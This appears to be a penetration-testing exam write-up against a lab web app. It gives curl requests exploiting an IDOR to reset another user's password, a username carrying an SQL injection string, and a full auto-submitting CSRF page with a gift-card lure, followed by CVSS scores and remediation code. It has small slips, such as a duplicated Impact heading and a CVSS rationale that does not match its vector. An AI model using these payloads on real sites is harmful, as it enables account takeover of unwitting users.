# FailSafe PWPA Exam - Phase 2: Account Page Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/account

---

## IDOR Vulnerability Testing - Account Update

### Vulnerability: Insecure Direct Object Reference (IDOR) - 25 points

**Description:**  
The account update endpoint (`POST /account/update`) accepts an optional `user_id` parameter in the JSON body that should not exist. When this parameter is present, it overrides session-based authorization and allows authenticated users to modify any other user's account password without proper validation.

**Impact:**  
Attackers can change other users' passwords by adding a `user_id` parameter to the request body. This parameter should be rejected entirely - the application should always use the authenticated session to identify which user is making the update.

**Impact:**  
Attackers can change other users' passwords, leading to complete account takeover. Combined with SQL injection, this allows unauthorized access to any user account in the system.

**Technical Details:**

**Vulnerable Endpoint:** POST /account/update
**Parameter:** `user_id` (in JSON body)
**Vulnerability Type:** Broken Access Control / IDOR

---

## Step-by-Step Recreation

### Prerequisites:
- Two user accounts (attacker account and target account)
- Valid session cookie for attacker account
- Access to Burp Suite or curl

### Accounts Used:
- **Attacker Account:** testuser1 / Password123!
- **Target Account:** test' OR '1'='1 / Password123! (SQL-injected account)

### Step 1: Login as Attacker (testuser1)

```bash
curl -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser1","password":"Password123!"}'
```

**Response:**
```http
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88; Path=/; HttpOnly

{"message":"Login successful.","success":true}
```

**Copy the cookie:** `connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88`

### Step 2: Test Updating Own Account (Control)

```bash
curl -X POST http://10.0.0.10/account/update \
  -H "Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88" \
  -H "Content-Type: application/json" \
  -d '{"password":"Password123!","updatedPassword":"newpass123","updateField":"account"}'
```

**Expected Response:**
```json
{"success":true,"message":"Account password updated successfully!"}
```

**Note:** In the legitimate request, there's no `user_id` parameter. The application should use the session to identify which user is making the update.

### Step 3: Test IDOR - Update Another User's Account (user_id=2)

```bash
curl -X POST http://10.0.0.10/account/update \
  -H "Cookie: connect.sid=s%3Ae3Eb2t-3HGOrpeXqxjmYmGprfLarVIXR.I0pzkyMIRP7STivrqi3tQqcxH1pQlOEoVCfg9q%2B7q88" \
  -H "Content-Type: application/json" \
  -d '{"password":"Password123!","updatedPassword":"hacked123","updateField":"account","user_id":"2"}'
```

**Vulnerable Response (IDOR Confirmed):**
```json
{"success":true,"message":"Account password updated successfully!"}
```

**Analysis:** The application accepts the request and updates User 2's password without verifying authorization. The attacker (User 1) successfully modified another user's account.

### Step 4: Verify IDOR Impact

Attempt to login as the target user with the new password:

```bash
curl -X POST http://10.0.0.10/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test' OR '1'='1","password":"hacked123"}'
```

**If successful:** Login succeeds with the new password, confirming account takeover.

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 8.8 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**Rationale:** Network attack, low complexity, low privileges required (authenticated user), no user interaction, unchanged scope, high confidentiality/integrity/availability impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple parameter modification
- **Required Access Level:** Low (authenticated user)
- **Technical Skill Required:** Low
- **Available Tools:** curl, Burp Suite

---

## Remediation

1. **Implement proper authorization checks:**
   ```javascript
   // Vulnerable code
   app.post('/account/update', (req, res) => {
     const { user_id, password, updatedPassword } = req.body;
     db.query("UPDATE users SET password = ? WHERE id = ?", [updatedPassword, user_id]);
   });

   // Secure code
   app.post('/account/update', (req, res) => {
     const { user_id, password, updatedPassword } = req.body;
     const authenticatedUserId = req.session.userId;
     
     // Verify user can only update their own account
     if (user_id !== authenticatedUserId) {
       return res.status(403).json({ success: false, message: "Unauthorized" });
     }
     
     db.query("UPDATE users SET password = ? WHERE id = ?", [updatedPassword, user_id]);
   });
   ```

2. **Remove user-controlled ID parameters** - Use session user ID instead
3. **Implement role-based access control (RBAC)**
4. **Add audit logging** for account modifications
5. **Implement rate limiting** on sensitive operations

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (IDOR/Broken Access Control)

---

## CSRF Vulnerability Testing - Account Update

### Vulnerability: Cross-Site Request Forgery (CSRF) - Reportable

**Description:**  
The account update endpoint (`POST /account/update`) lacks Cross-Site Request Forgery protection. An attacker can create malicious web pages that force authenticated users to change their account passwords without their knowledge or consent.

**Impact:**  
Attackers can compromise user accounts by tricking authenticated users into submitting password change requests. This can lead to account takeover, especially when combined with phishing attacks. Users may unknowingly change their passwords, locking themselves out or allowing attacker access.

**Technical Details:**

**Vulnerable Endpoint:** POST /account/update
**Missing Protection:** No CSRF tokens or SameSite cookie attributes
**Authentication Required:** Yes (session-based)
**Attack Vector:** Malicious HTML forms, links, or embedded content

---

## Step-by-Step Recreation

### Prerequisites:
- Valid user session (authenticated user browsing attacker's site)
- Malicious HTML page hosted on attacker's domain
- User interaction (clicking link or visiting malicious page)

### Step 1: Create Malicious CSRF Page

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Password Reset</title>
</head>
<body>
    <h1>Free Gift Card!</h1>
    <p>Click here to claim your $100 gift card:</p>
    
    <form action="http://10.0.0.10/account/update" method="POST" style="display:none;" id="csrfForm">
        <input type="hidden" name="password" value="attackerpassword">
        <input type="hidden" name="updatedPassword" value="attackerpassword">
        <input type="hidden" name="updateField" value="account">
    </form>
    
    <button onclick="document.getElementById('csrfForm').submit();">Claim Gift Card</button>
    
    <script>
        // Auto-submit for demonstration
        setTimeout(() => { document.getElementById('csrfForm').submit(); }, 1000);
    </script>
</body>
</html>
```

### Step 2: Host Malicious Page

Upload the HTML file to a web server under attacker's control.

### Step 3: Trick Victim into Visiting

Send phishing email or link to authenticated user: `http://attacker-site.com/csrf.html`

### Step 4: CSRF Attack Execution

When victim visits the page while logged into FailSafe:
1. Browser automatically sends session cookie with POST request
2. Server processes request as legitimate password change
3. Victim's password is changed to `attackerpassword`

**Response:** `{"success":true,"message":"Account password updated successfully!"}`

### Step 5: Verify Impact

Attacker can now login with the new password: `attackerpassword`

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 6.8 (Medium)  
**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N  
**Rationale:** Network attack, high complexity (requires user interaction), no privileges required, user interaction required, unchanged scope, high confidentiality impact.

**Likelihood / Exploitability:**
- **Exploitability:** Moderate - requires social engineering
- **Required Access Level:** None
- **Technical Skill Required:** Low
- **Available Tools:** Any web server, HTML knowledge

---

## Remediation

1. **Implement CSRF tokens:**
   ```javascript
   // Add to forms
   <input type="hidden" name="csrf_token" value="<%= csrfToken %>">
   
   // Validate on server
   app.post('/account/update', (req, res) => {
     if (!verifyCsrfToken(req.body.csrf_token)) {
       return res.status(403).json({ success: false, message: "CSRF token invalid" });
     }
     // Process request
   });
   ```

2. **Use SameSite cookie attribute:**
   ```javascript
   // Set session cookie with SameSite
   res.cookie('connect.sid', sessionId, { 
     httpOnly: true, 
     sameSite: 'strict' 
   });
   ```

3. **Implement double-submit cookie pattern**
4. **Add CAPTCHA or additional verification** for sensitive operations
5. **Use custom headers** for AJAX requests (not applicable for HTML forms)

---

## Status

**Status:** Confirmed  
**Severity:** Medium  
**Points:** Reportable (CSRF vulnerability)

---

[Screenshots to be added here]
- Screenshot of CSRF PoC HTML page
- Screenshot of successful CSRF attack response
- Screenshot of account takeover with new password